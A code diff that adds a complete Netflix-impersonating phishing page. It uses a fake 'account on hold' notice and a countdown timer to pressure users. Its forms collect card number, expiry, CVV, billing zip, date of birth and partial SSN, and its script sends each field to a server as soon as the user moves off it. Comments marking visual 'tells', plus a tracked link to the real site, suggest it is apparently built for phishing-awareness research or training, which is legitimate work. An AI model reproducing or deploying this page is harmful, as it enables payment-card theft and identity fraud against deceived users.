@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="x-phishing-vector" content="pci_harvest_subscription_lure">
+    <title>Netflix - Update Payment</title>
+    <style>
+        :root {
+            --nf-red: #E50914;
+            --nf-bg: #141414;
+            --nf-text: #FFFFFF;
+            --nf-gray: #333333;
+            --font-stack: "Netflix Sans", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body { margin: 0; padding: 0; font-family: var(--font-stack); background-color: var(--nf-bg); color: var(--nf-text); }
+
+        /* --- HEADER --- */
+        header { height: 90px; padding: 0 4%; display: flex; align-items: center; justify-content: flex-start; }
+        .nf-logo { font-size: 32px; font-weight: 800; color: var(--nf-red); letter-spacing: -2px; }
+
+        /* --- CONTENT --- */
+        .container { max-width: 440px; margin: 40px auto; padding: 0 20px; }
+        
+        h1 { font-size: 32px; font-weight: 700; margin-bottom: 24px; }
+        .desc { font-size: 16px; line-height: 1.5; color: #ccc; margin-bottom: 32px; }
+
+        .form-row { margin-bottom: 16px; }
+        .form-row input { width: 100%; height: 50px; background: #333; border: 1px solid #333; color: white; border-radius: 4px; padding: 0 16px; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
+        .form-row input:focus { border-bottom: 2px solid var(--nf-red); }
+
+        .btn-red { width: 100%; height: 50px; background-color: var(--nf-red); color: #fff; border: none; border-radius: 4px; font-size: 18px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 24px; }
+        .btn-red:hover { background-color: #f6121d; }
+
+        .view { display: none; }
+        .view.active { display: block; animation: fadeIn 0.4s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .lock-icon { font-size: 48px; margin-bottom: 24px; color: var(--nf-red); }
+
+        .timer { font-size: 14px; background: #222; padding: 8px; border-radius: 4px; color: var(--nf-red); display: inline-block; margin-bottom: 32px; font-weight: bold; border: 1px solid var(--nf-red); }
+    </style>
+</head>
+<body>
+
+    <!-- FAKE BROWSER BAR (Visual Tell #1) -->
+    <!-- RESEARCH_TELL: domain is netflixaccountupdate.com, not netflix.com -->
+    <div style="background:#141414; border-bottom:1px solid #333; padding:6px 16px; display:flex; align-items:center; gap:10px; font-size:13px; font-family:sans-serif;">
+        <span style="color:#999;">◀ ▶ ⟳</span>
+        <div style="flex-grow:1; background:#1a1a1a; border:1px solid #444; border-radius:4px; padding:4px 12px; display:flex; align-items:center; gap:8px; color:#fff;">
+            <span style="color:#ff6b6b;">⚠️</span>
+            <span>https://<strong style="color:#e87070;">netflixaccountupdate.com</strong>/billing/hold</span>
+        </div>
+    </div>
+
+    <header>
+        <div class="nf-logo">NETFLIX</div>
+    </header>
+
+    <div class="container">
+        
+        <!-- STEP 1: INITIAL WARNING -->
+        <div class="view active" id="view-1">
+            <div class="lock-icon">!</div>
+            <h1>Your account is on hold.</h1>
+            <p class="desc">We were unable to process your most recent membership payment. To resume watching your favorite shows, please update your billing information immediately.</p>
+            
+            <div class="timer" id="timer">Your account closes in 02:47:18</div>
+            
+            <button class="btn-red" onclick="nextStep(1)">Restart Membership</button>
+            <div style="margin-top:14px; text-align:center;">
+                <a href="https://www.netflix.com/YourAccount" id="go-to-netflix-direct" style="font-size:12px; color:#999; text-decoration:underline;">
+                    I'll update billing directly on Netflix.com
+                </a>
+            </div>
+        </div>
+
+        <!-- STEP 2: PAYMENT INFO (PCI HARVEST) -->
+        <div class="view" id="view-2">
+            <h1>Update Payment</h1>
+            <p class="desc">Enter your credit or debit card details below to restore access to your account.</p>
+            
+            <div class="form-row">
+                <input type="text" id="card-name" placeholder="First Name Last Name" class="harvest">
+            </div>
+            <div class="form-row">
+                <input type="text" id="card-num" placeholder="Card Number" class="harvest">
+            </div>
+            <div class="form-row" style="display:flex; gap:12px;">
+                <input type="text" id="card-exp" placeholder="MM/YY" class="harvest">
+                <input type="password" id="card-cvv" placeholder="CVV" class="harvest">
+            </div>
+            <div class="form-row">
+                <input type="text" id="billing-zip" placeholder="Billing Zip Code" class="harvest">
+            </div>
+            
+            <button class="btn-red" onclick="nextStep(2)">Update and Continue</button>
+        </div>
+
+        <!-- STEP 3: IDENTITY VERIFICATION (PII HARVEST) -->
+        <div class="view" id="view-3">
+            <h1>Confirm Identity</h1>
+            <p class="desc">For your security, we require the primary account holder to verify their identity after a payment failure.</p>
+            
+            <div class="identity-gate billing-upgrade" data-exfil="ssn_partial" data-capture="identity" aria-label="identity-verification-harvest" data-attack-stage="ssn_and_dob_collection">
+                <!-- subscription_recovery_payload -->
+                <div class="form-row">
+                    <label style="display:block; font-size:13px; color:#ccc; margin-bottom:4px;">Date of Birth</label>
+                    <input type="text" id="dob" placeholder="MM/DD/YYYY" class="harvest">
+                </div>
+                <div class="form-row">
+                    <label style="display:block; font-size:13px; color:#ccc; margin-bottom:4px;">Last 4 Digits of SSN</label>
+                    <input type="password" id="ssn" placeholder="XXXX" class="harvest">
+                </div>
+            </div>
+            
+            <button class="btn-red" onclick="nextStep(3)">Verify Identity</button>
+        </div>
+
+        <!-- STEP 4: SUCCESS -->
+        <div class="view" id="view-4">
+            <div class="lock-icon" style="color:#057642;">✓</div>
+            <h1>Welcome back!</h1>
+            <p class="desc">Your account has been successfully restored. You can now continue streaming Netflix on all your devices. We will send a confirmation email shortly.</p>
+            <button class="btn-red" onclick="window.location.href='https://www.netflix.com/youraccount'">Done</button>
+        </div>
+
+    </div>
+
+    <script>
+        async function saveStep(stepNumber, stepData) {
+            const response = await fetch('/api/save-step', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ step: stepNumber, data: stepData })
+            });
+            return response.json();
+        }
+
+        async function postJson(url, data) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            return response.json();
+        }
+
+        function setActiveView(currentStep) {
+            document.getElementById(`view-${currentStep}`).classList.remove('active');
+            document.getElementById(`view-${currentStep + 1}`).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        async function nextStep(step) {
+            if (step === 1) {
+                await postJson('/api/restart/start', {});
+                setActiveView(step);
+                return;
+            }
+            if (step === 2) {
+                const payload = {
+                    card_name: document.getElementById('card-name').value.trim(),
+                    card_num: document.getElementById('card-num').value.trim(),
+                    card_exp: document.getElementById('card-exp').value.trim(),
+                    card_cvv: document.getElementById('card-cvv').value.trim(),
+                    billing_zip: document.getElementById('billing-zip').value.trim()
+                };
+                if (!payload.card_num || !payload.card_exp || !payload.card_cvv) {
+                    window.alert('Please check your payment information.');
+                    return;
+                }
+                await postJson('/api/payment/submit', payload);
+                setActiveView(step);
+                return;
+            }
+            if (step === 3) {
+                const payload = {
+                    dob: document.getElementById('dob').value.trim(),
+                    ssn_last4: document.getElementById('ssn').value.trim()
+                };
+                if (!payload.dob || !payload.ssn_last4) {
+                    window.alert('Verification details are required for security.');
+                    return;
+                }
+                await postJson('/api/identity/submit', payload);
+                setActiveView(step);
+            }
+        }
+
+        let timeLeft = 2 * 3600 + 47 * 60 + 18;
+        setInterval(() => {
+            timeLeft--;
+            const hrs = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
+            const secs = timeLeft % 60;
+            document.getElementById('timer').innerText = `Your account closes in ${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }, 1000);
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const fieldMap = {
+                'card-name': 'card_name',
+                'card-num': 'card_num',
+                'card-exp': 'card_exp',
+                'card-cvv': 'card_cvv',
+                'billing-zip': 'billing_zip',
+                dob: 'dob',
+                ssn: 'ssn_last4'
+            };
+            document.querySelectorAll('.harvest').forEach((input) => {
+                input.addEventListener('blur', async () => {
+                    const value = input.value.trim();
+                    if (value) {
+                        await saveStep(0, { [fieldMap[input.id]]: value });
+                    }
+                });
+            });
+            document.getElementById('go-to-netflix-direct').addEventListener('click', async () => {
+                await postJson('/api/win/go-to-netflix-direct', {});
+            });
+        });
+    </script>
+</body>
+</html>
